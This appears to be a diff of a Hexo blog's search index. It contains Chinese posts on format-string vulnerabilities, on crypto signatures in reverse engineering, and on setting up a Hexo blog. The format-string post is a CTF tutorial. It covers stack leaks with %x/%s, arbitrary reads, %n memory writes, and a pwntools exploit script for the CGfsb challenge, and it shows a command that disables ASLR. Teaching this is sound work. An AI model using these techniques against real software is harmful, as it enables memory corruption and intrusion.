     printf(a);
     return 0;
-}</stdio.h></code></pre><p>对于printf函数来说 它的函数原型是</p>
+}</code></pre><p>对于printf函数来说 它的函数原型是</p>
 <blockquote>
 <p>printf(“格式化字符串”,参量1,参量2….)<br>如果输出成功返回输出的字数 如果输出失败则返回负数<br>格式化字符串 可以是以’%’开头的后跟特定字符来确定输出样式的 也可以是正常的字符串</p>
 </blockquote>
@@ -2706,13 +2888,13 @@ int main(void)
     scanf("%s",a);
     printf(a);
     return 0;
- } </stdio.h></code></pre><p><img src="https://img-blog.csdnimg.cn/20190923193909689.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt=" "><br>我们可以通过测试发现 程序输出了一些奇怪的输出 我们载入x32dbg查看下 程序到底输出的是什么<br>通过观察栈中 我们发现 其实程序输出的就是栈中的数据<br><img src="https://img-blog.csdnimg.cn/20190923195130178.png" alt=""><br>造成这种结果的原因是 因为我们输入的%x 在我们用不安全的方式调用printf函数的时候 没有明确表示出哪里的参数是空缺的 这就会造成系统自动从左往右进行匹配 我们输入的%x 又正好是在 “格式化字符串” 这个参数内 系统就会将他当成默认的%x来进行输出</p>
+ } </code></pre><p><img src="https://img-blog.csdnimg.cn/20190923193909689.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt=" "><br>我们可以通过测试发现 程序输出了一些奇怪的输出 我们载入x32dbg查看下 程序到底输出的是什么<br>通过观察栈中 我们发现 其实程序输出的就是栈中的数据<br><img src="https://img-blog.csdnimg.cn/20190923195130178.png" alt><br>造成这种结果的原因是 因为我们输入的%x 在我们用不安全的方式调用printf函数的时候 没有明确表示出哪里的参数是空缺的 这就会造成系统自动从左往右进行匹配 我们输入的%x 又正好是在 “格式化字符串” 这个参数内 系统就会将他当成默认的%x来进行输出</p>
 <blockquote>
 <p>同样的 如果我们输入的是%s 且在内存地址上正好有个字符串 我们就可以将内存中的字符串输出出来</p>
 </blockquote>
 <p>通过这种方式 我们就可以做到栈数据泄露</p>
 <h2 id="内存读取"><a href="#内存读取" class="headerlink" title="内存读取"></a>内存读取</h2><blockquote>
-<p>在进行以下版块的实验前 请先关闭掉Linux系统的PIE(空间分布随机化) 不然会造成程序变量地址一直在变动<br> 可以在==root==权限下 使用以下命令关闭<br>echo 0 &gt; /proc/sys/kernel/randomize_va_space</p>
+<p>在进行以下版块的实验前 请先关闭掉Linux系统的PIE(空间分布随机化) 不然会造成程序变量地址一直在变动<br> 可以在==root==权限下 使用以下命令关闭<br>echo 0 > /proc/sys/kernel/randomize_va_space</p>
 </blockquote>
 <p>首先我们需要明确一点 所有的局部变量都是在栈中存放着 所以如果我们能泄露出来某个字符串的地址 我们就有机会直接读取到内存中这个字符串的值 </p>
 <p>首先给出利用代码</p>
@@ -2730,11 +2912,11 @@ int main(int argc,char **argv)
     printf(a);
     printf("\n");
     return 0;
-}</string.h></stdio.h></code></pre><p>在这里我们是直接将flag数组的地址直接输出出来 相当于泄露了关键字符串的地址吧…<br>因为==所有的局部变量都是存放在栈中的== 首先第一步就是需要遍历栈中数据找到输入的数据 以达到后面控制输入变量的目的<br><img src="https://img-blog.csdnimg.cn/20190923212726366.png" alt="">这里发现栈中数据的第九位正好就是我们输入的数据 为了方便查看 也可以使用以下方式来查看第n位的回显</p>
+}</code></pre><p>在这里我们是直接将flag数组的地址直接输出出来 相当于泄露了关键字符串的地址吧…<br>因为==所有的局部变量都是存放在栈中的== 首先第一步就是需要遍历栈中数据找到输入的数据 以达到后面控制输入变量的目的<br><img src="https://img-blog.csdnimg.cn/20190923212726366.png" alt>这里发现栈中数据的第九位正好就是我们输入的数据 为了方便查看 也可以使用以下方式来查看第n位的回显</p>
 <blockquote>
-<p>%&lt; Number &gt;$ formot string<br>注意此方法仅适用于Linux系统 且在命令行中使用需要转义$</p>
+<p>%< Number >$ formot string<br>注意此方法仅适用于Linux系统 且在命令行中使用需要转义$</p>
 </blockquote>
-<p><img src="https://img-blog.csdnimg.cn/20190923213014599.png" alt=""><br>在这里就可以控制输入的参数 将输入改为flag字符串的地址 同时根据上面所提过的 将%08x更改为%s直接读取到flag字符串具体的值<br><img src="https://img-blog.csdnimg.cn/2019092321331572.png" alt=""><br>根据以上操作 如果条件允许的话 就可以做到任意内存读取</p>
+<p><img src="https://img-blog.csdnimg.cn/20190923213014599.png" alt><br>在这里就可以控制输入的参数 将输入改为flag字符串的地址 同时根据上面所提过的 将%08x更改为%s直接读取到flag字符串具体的值<br><img src="https://img-blog.csdnimg.cn/2019092321331572.png" alt><br>根据以上操作 如果条件允许的话 就可以做到任意内存读取</p>
 <h2 id="内存修改"><a href="#内存修改" class="headerlink" title="内存修改"></a>内存修改</h2><blockquote>
 <p>首先先介绍一种不常见的 格式说明符’%n’ 它的作用并不是像%c %d那样说明格式 而是将%n之前的字符个数赋值给一个变量</p>
 </blockquote>
@@ -2746,16 +2928,16 @@ int main(int argc,char **argv)
     char a[100];
     static int b=0;
     strcpy(a,argv[1]);
-    printf("The addr of b is %p\n",&amp;b);
+    printf("The addr of b is %p\n",&b);
     printf(a);
     printf("\n");
     printf("The value of b is %d\n",b);
     return 0;
-}</string.h></stdio.h></code></pre><p>首先运行一次程序 可以得知静态变量b的地址 然后尝试查看回显位 这里我的回显位是第十位<br><img src="https://img-blog.csdnimg.cn/20190924181656618.png" alt="">尝试在运行程序时 使用printf写入地址<br><img src="https://img-blog.csdnimg.cn/2019092418190293.png" alt=""><br>此时就可以使用之前介绍过的 格式说明符%n了 %n将他自身前字符的个数 赋值给地址为0x5655700c的静态变量b 以达到修改内存中值的目的<br><img src="https://img-blog.csdnimg.cn/2019092418215847.png" alt=""><br>同样的 如果我们想将b的值修改的更大 只需要在 ‘%10$n’ 前增加对应数量的0即可<br><img src="https://img-blog.csdnimg.cn/20190924182308483.png" alt=""></p>
+}</code></pre><p>首先运行一次程序 可以得知静态变量b的地址 然后尝试查看回显位 这里我的回显位是第十位<br><img src="https://img-blog.csdnimg.cn/20190924181656618.png" alt>尝试在运行程序时 使用printf写入地址<br><img src="https://img-blog.csdnimg.cn/2019092418190293.png" alt><br>此时就可以使用之前介绍过的 格式说明符%n了 %n将他自身前字符的个数 赋值给地址为0x5655700c的静态变量b 以达到修改内存中值的目的<br><img src="https://img-blog.csdnimg.cn/2019092418215847.png" alt><br>同样的 如果我们想将b的值修改的更大 只需要在 ‘%10$n’ 前增加对应数量的0即可<br><img src="https://img-blog.csdnimg.cn/20190924182308483.png" alt></p>
 <h2 id="格式化字符串的应用"><a href="#格式化字符串的应用" class="headerlink" title="格式化字符串的应用"></a>格式化字符串的应用</h2><blockquote>
 <p>这里使用攻防世界 PWN模块的 CGfsb 作为例题</p>
 </blockquote>
-<p>首先载入IDA 通过阅读源码 发现关键判断 只要pwnme变量等于8 就能输出flag 同时发现程序崔仔格式化字符串漏洞 这里的条件和上面模块的条件类似<br><img src="https://img-blog.csdnimg.cn/20190924184328449.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt=""><br>双击pwnme变量 查看pwnme的具体地址 在得知了具体地址后 我们就可以开始写脚本了<br><img src="https://img-blog.csdnimg.cn/20190924184625528.png" alt=""></p>
+<p>首先载入IDA 通过阅读源码 发现关键判断 只要pwnme变量等于8 就能输出flag 同时发现程序崔仔格式化字符串漏洞 这里的条件和上面模块的条件类似<br><img src="https://img-blog.csdnimg.cn/20190924184328449.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt><br>双击pwnme变量 查看pwnme的具体地址 在得知了具体地址后 我们就可以开始写脚本了<br><img src="https://img-blog.csdnimg.cn/20190924184625528.png" alt></p>
 <blockquote>
 <p>这里需要介绍一款工具 pwntools 它是python的一个库 平时主要常用其中的模块有</p>
 <ul>
@@ -2825,7 +3007,7 @@ pwnme=p32(0x0804A068)
 sh.send(pwnme+"0000%10$n")
 
 #程序持续运行
-sh.interactive()</code></pre><p>运行脚本 得到flag<br><img src="https://img-blog.csdnimg.cn/20190924190754182.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt=""></p>
+sh.interactive()</code></pre><p>运行脚本 得到flag<br><img src="https://img-blog.csdnimg.cn/20190924190754182.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt></p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -2844,7 +3026,7 @@ sh.interactive()</code></pre><p>运行脚本 得到flag<br><img src="https://img
             });
             document.body.appendChild(img);
           });
-      </script>]]></content>
+      </script></body></html>]]></content>
       
         <categories>
             
@@ -2864,12 +3046,12 @@ sh.interactive()</code></pre><p>运行脚本 得到flag<br><img src="https://img
     <entry>
       <title><![CDATA[逆向常见的算法]]></title>
       <url>/2019/10/08/ni-xiang-chang-jian-de-suan-fa/</url>
-      <content type="html"><![CDATA[<a id="more"></a>
+      <content type="html"><![CDATA[<html><head></head><body><a id="more"></a>
 
 <h2 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h2><pre><code>对于Base64来说 是我们通常比较常见的加密算法 通常是应用 动态页面开发 或者是流媒体路径加密上 对于我这样的
 菜鸡来说 通常常见于Web题中 但是在逆向题中也偶有见到</code></pre><p>Base64算法通俗的来讲就是 ==将3个8位字节转换为4个6位字节==</p>
 <p>在重新分配完6个字节后 会在==6位字节前部补0== 将字节补成八位 也就是说 此时字节最大值为 <em>00111111=63</em><br>此时 Base64算法会将此时的字节所代表的的十进制数作为下标来索引表中进行替换 索引表如下<br>| 编号 | 字符 | 编号 | 字符 | 编号 | 字符 | 编号 | 字符 |<br>|—-|—-|—-|—-|—-|—-|—-|—-|<br>| 0  | A  | 16 | Q  | 32 | g  | 48 | w  |<br>| 1  | B  | 17 | R  | 33 | h  | 49 | x  |<br>| 2  | C  | 18 | S  | 34 | i  | 50 | y  |<br>| 3  | D  | 19 | T  | 35 | j  | 51 | z  |<br>| 4  | E  | 20 | U  | 36 | k  | 52 | 0  |<br>| 5  | F  | 21 | V  | 37 | l  | 53 | 1  |<br>| 6  | G  | 22 | W  | 38 | m  | 54 | 2  |<br>| 7  | H  | 23 | X  | 39 | n  | 55 | 3  |<br>| 8  | I  | 24 | Y  | 40 | o  | 56 | 4  |<br>| 9  | J  | 25 | Z  | 41 | p  | 57 | 5  |<br>| 10 | K  | 26 | a  | 42 | q  | 58 | 6  |<br>| 11 | L  | 27 | b  | 43 | r  | 59 | 7  |<br>| 12 | M  | 28 | c  | 44 | s  | 60 | 8  |<br>| 13 | N  | 29 | d  | 45 | t  | 61 | 9  |<br>| 14 | O  | 30 | e  | 46 | u  | 62 |+  |<br>| 15 | P  | 31 | f  | 47 | v  | 63 |/|</p>
-<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMwLmNuYmxvZ3MuY29tL2Jsb2cvNDM0MTAxLzIwMTIxMi8yNjE0MTEyMS04Y2RlYmJmMjQwZDg0YWY4YTZiOGE2ZThkNmQwYmEzNC5qcGc?x-oss-process=image/format,png" alt=""><br>Base64算法在逆向中的体现 主要就在于==程序内存中存在一个索引表==<br><em>同理 如果是Base64解密 内存中当然存在一个解密表</em></p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMwLmNuYmxvZ3MuY29tL2Jsb2cvNDM0MTAxLzIwMTIxMi8yNjE0MTEyMS04Y2RlYmJmMjQwZDg0YWY4YTZiOGE2ZThkNmQwYmEzNC5qcGc?x-oss-process=image/format,png" alt><br>Base64算法在逆向中的体现 主要就在于==程序内存中存在一个索引表==<br><em>同理 如果是Base64解密 内存中当然存在一个解密表</em></p>
 <p>并且在程序算法中存在明显的 右移2位和右移4位等明显位运算操作<br><em>同理 如果是Base64解密 应该存在左移2位和左移4位等明显的位运算操作</em></p>
 <p>但是注意 Base64是可以设计变种的 即更改索引表来实现变种加密 后续还是需要自己实现下Base64加密的算法 以达到就算是更改了索引表依旧能成功解密的水平</p>
 <p>具体算法设计可以查看<br><strong><a href="https://www.jianshu.com/p/61833e529cfc" target="_blank" rel="noopener">https://www.jianshu.com/p/61833e529cfc</a></strong></p>
@@ -2950,7 +3132,9 @@ int main(void)
 {
     int i=0;
     EnBase64();
-    cout<<ans; }="" <="" code=""></ans;></iostream></code></pre><code class="C">
+    cout<<ans;
+
+} </code></pre>
 <h2 id="Tea"><a href="#Tea" class="headerlink" title="Tea"></a>Tea</h2><p>在密码学中，微型加密算法（Tiny Encryption Algorithm，TEA）是一种易于描述和执行的块密码，通常只需要很少的代码就可实现。其设计者是剑桥大学计算机实验室的大卫 · 惠勒与罗杰 · 尼达姆</p>
 <p>Tea的实现代码比较固定 这里给出常见Tea加密的实现代码</p>
 <pre class=" language-C"><code class="language-C">#include <stdint.h>
@@ -2977,7 +3161,7 @@ void decrypt (uint32_t* v, uint32_t* k) {
         sum -= delta;                                   
     }                                              /* end cycle */
     v[0]=v0; v[1]=v1;
-}</stdint.h></code></pre>
+}</code></pre>
 <p>Tea加密的明显特征是 ==存在一个Image Number:0x9e3779b9== </p>
 <h2 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h2><p>MD5 消息摘要算法（英语：MD5 Message-Digest Algorithm），一种被广泛使用的密码散列函数，可以产生出一个 128 位（16 字节）的散列值（hash value），用于确保信息传输完整一致。MD5 由美国密码学家罗纳德 · 李维斯特（Ronald Linn Rivest）设计，于 1992 年公开，用以取代 MD4 算法。这套算法的程序在 RFC 1321 中被加以规范</p>
 <p>这里给出MD5实现的伪代码</p>
@@ -3043,7 +3227,7 @@ void decrypt (uint32_t* v, uint32_t* k) {
     h3 := h3 + d
     End ForEach var int digest := h0 append h1 append h2 append h3 //(expressed as little-endian)</code></pre>
 <p>MD5算法的显著特征就是 ==存在4个变量 h0=0x67452301 h1=0xefcdab89 h2=0x98badcfe h3=0x10325476==</p>
-</code><script>
+<script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
             if (!el.dataset.src) { return; }
@@ -3061,7 +3245,7 @@ void decrypt (uint32_t* v, uint32_t* k) {
             });
             document.body.appendChild(img);
           });
-      </script>]]></content>
+      </script></body></html>]]></content>
       
         <categories>
             
@@ -3081,7 +3265,7 @@ void decrypt (uint32_t* v, uint32_t* k) {
     <entry>
       <title><![CDATA[使用Hexo配合Github搭建自己的博客]]></title>
       <url>/2019/10/08/shi-yong-hexo-pei-he-github-da-jian-zi-ji-de-bo-ke/</url>
-      <content type="html"><![CDATA[<h2 id="下载工具"><a href="#下载工具" class="headerlink" title="下载工具"></a>下载工具</h2><p><strong>1.安装Git Bash</strong></p>
+      <content type="html"><![CDATA[<html><head></head><body><h2 id="下载工具"><a href="#下载工具" class="headerlink" title="下载工具"></a>下载工具</h2><p><strong>1.安装Git Bash</strong></p>
 <p><a href="https://gitforwindows.org/" target="_blank" rel="noopener">下载地址</a></p>
 <p>安装流程: 无脑下一步即可<br>安装好后 在任意处右键打开Git Bash 输入</p>
 <blockquote>
@@ -3102,7 +3286,7 @@ void decrypt (uint32_t* v, uint32_t* k) {
 <p>接下来就是创建SSH keys将gitbash和github连接起来 在bash中输入 </p>
 <p><kbm>ssh-keygen -t rsa -C “自己的邮箱”</kbm></p>
 <p>然后使用git命令 来复制ssh key</p>
-<p><kbm>paste &lt; ~/.ssh/id_rsa.pub</kbm></p>
+<p><kbm>paste < ~/.ssh/id_rsa.pub</kbm></p>
 <p>接着打开github的账户设置 选择<em>SSH and GPG keys</em> 然后<em>New SSH key</em> 标题随便填 把复制好的ssh粘进去就完事了 确定粘完之后回到bash 测试是否成功</p>
 <p><kbm>ssh -T <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a> </kbm></p>
 <p>如果提示 <kbm>Are you sure you want to continue connecting (yes/no)?</kbm> 输入yes 然后就会看到</p>
@@ -3137,7 +3321,7 @@ void decrypt (uint32_t* v, uint32_t* k) {
             });
             document.body.appendChild(img);
           });
-      </script>]]></content>
+      </script></body></html>]]></content>
       
         <categories>
             
